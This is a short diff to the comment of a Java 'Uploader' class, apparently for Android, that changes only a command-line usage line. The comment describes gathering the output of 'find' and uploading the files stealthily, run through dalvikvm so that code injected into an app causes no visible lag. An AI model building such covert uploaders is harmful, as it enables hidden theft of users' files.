@@ -10,7 +10,7 @@ public class Uploader {
     /*
 	 What to do in this class: 
      get result list from 'find' command, then upload file(s) stealthily (No foreground delay)
-     Command line usage: dalvikvm -cp Uploader.dex Uploader
+     Command line usage: dalvikvm -cp classes.dex Uploader
          
 	 Benefit of using dalvikvm to run codes:
 	 Android app is run under single thread, too much code injected will make the app pauses/lags. 
